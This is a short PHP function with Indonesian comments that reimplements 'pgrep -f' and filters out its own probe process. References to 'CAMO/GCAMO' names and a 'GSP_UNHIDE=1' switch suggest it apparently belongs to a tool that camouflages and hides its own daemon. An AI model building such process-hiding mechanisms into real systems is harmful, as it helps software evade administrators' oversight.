/* pgrep -f pengganti: array pid yang cmdline-nya mengandung $pat */
function gsp_pgrep($pat) {
    $pids = array();
    if ($pat === '') return $pids;
    if (gsp_shell_ok()) {
        /* preg_quote: CAMO/GCAMO mengandung [] yang dibaca pgrep sebagai regex
           character-class (cocokkan hampir SEMUA proses) -> harus diliteralkan */
        $o = gsp_sh('GSP_UNHIDE=1 pgrep -f ' . escapeshellarg(preg_quote($pat)));
        if ($o !== '') foreach (explode("\n", $o) as $x) {
            $x = intval(trim($x));
            if ($x <= 0) continue;
            /* buang shell probe itu sendiri: cmdline sh -c "pgrep -f '<pat>'" ikut
               mengandung <pat> sehingga pgrep selalu match dirinya -> status hidup palsu.
               probe sudah mati saat dibaca -> cmdline kosong/tak terbaca -> wajib dibuang;
               daemon asli pasti hidup dan cmdline-nya terbaca. */
            $cl = @file_get_contents('/proc/' . $x . '/cmdline');
            if (!is_string($cl) || $cl === '') continue;
            if (strpos($cl, 'pgrep') !== false) continue;
            $pids[] = $x;
        }
        return $pids;
    }
    foreach (gsp_proc_list() as $pr) if (strpos($pr['cmd'], $pat) !== false) $pids[] = $pr['pid'];
    return $pids;
}
